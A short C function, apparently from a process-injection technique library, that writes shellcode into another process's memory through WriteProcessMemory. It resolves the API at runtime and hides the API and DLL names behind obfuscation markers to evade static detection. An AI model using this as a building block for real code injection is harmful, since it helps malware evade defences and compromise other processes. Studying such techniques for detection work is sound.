// Description: writing shellcode to alocated memory using WriteProcessMemory
// Used WinAPIs: WriteProcessMemory
// IOCS strings:
BOOL WriteMemory(HANDLE process, LPVOID baseAddress, LPCVOID buffer, SIZE_T size) {
    typedef BOOL (WINAPI * WriteProcessMemory_) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);

    WriteProcessMemory_ _WriteProcessMemory = (WriteProcessMemory_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"WriteProcessMemory"<ob_end>);

    SIZE_T written = 0;
    BOOL status = _WriteProcessMemory(process, baseAddress, buffer, size, &written);
    #ifdef DEBUG
        if (!status) {
            printf("[-] WriteProcessMemory failed (%d)\n", GetLastError());
        }
    #endif
    return status;
}
